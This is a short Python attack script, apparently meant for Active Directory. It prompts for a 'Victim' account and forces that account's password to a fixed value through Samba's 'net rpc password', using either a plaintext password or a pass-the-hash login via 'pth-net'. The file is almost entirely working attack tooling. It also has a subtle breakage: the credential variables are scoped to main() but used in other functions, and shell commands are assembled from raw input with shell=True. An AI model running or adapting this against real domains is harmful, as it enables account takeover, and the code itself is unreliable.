import os
import subprocess
from argument_parser import parse_arguments  # Import the parse_arguments function from argument_parser.py

# Install missing dependencies if necessary
try:
    from colorama import Fore
except ImportError:
    os.system("sudo pip install colorama")

# Set colorama color constants
RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET


def ForceChangeH():
    tar = input(f"{CYAN}Victim:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    print(f"{YELLOW}Changing {tar} password to P@ssw0rd123!@#")
    subprocess.call([f"pth-net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%00000000000000000000000000000000:{HASH} -S {DOMAIN}"], shell=True)

def ForceChangeP():
    tar = input(f"{CYAN}Victim:{RED} ")
    subprocess.call([f"{RESET}"], shell=True)
    print(f"{YELLOW}Changing {tar} password to P@ssw0rd123!@#")
    subprocess.call([f"net rpc password {tar} 'P@ssw0rd123!@#' -U {DOMAIN}/{USER}%{PASS} -S {DOMAIN}"], shell=True)
def main():
    # Get the arguments from the argument_parser.py
    args = parse_arguments()

    # Extract arguments
    DOMAIN = args.DomainName
    USER = args.Username
    PASS = args.Password
    HASH = args.PassTheHash  

    # Execute the appropriate function based on the parsed arguments
    if HASH:
        ForceChangeH()
    else:
        ForceChangeP()  

if __name__ == '__main__':
    main()

